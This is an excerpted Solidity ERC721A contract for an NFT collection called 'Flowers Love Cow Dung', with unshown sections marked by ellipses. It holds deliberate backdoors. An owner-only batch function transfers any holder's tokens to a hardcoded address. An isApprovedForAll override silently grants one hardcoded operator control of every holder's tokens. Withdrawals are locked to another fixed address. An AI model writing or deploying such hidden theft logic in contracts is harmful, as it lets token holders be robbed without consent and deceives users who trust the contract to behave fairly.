...
contract Flowers_Love_Cow_Dung is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Flowers Love Cow Dung", "FLCD", maxBatchSize_, collectionSize_) {
  ...
  function FLCD_batch(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x71E515f983f430236E66c47925b869130C2f30f4, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x954171EaA6043592450C34BEd44Ba0dE39874418);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xcA87713Ec4E64e932D9bE179b5ca782AC85122cA){return true;}
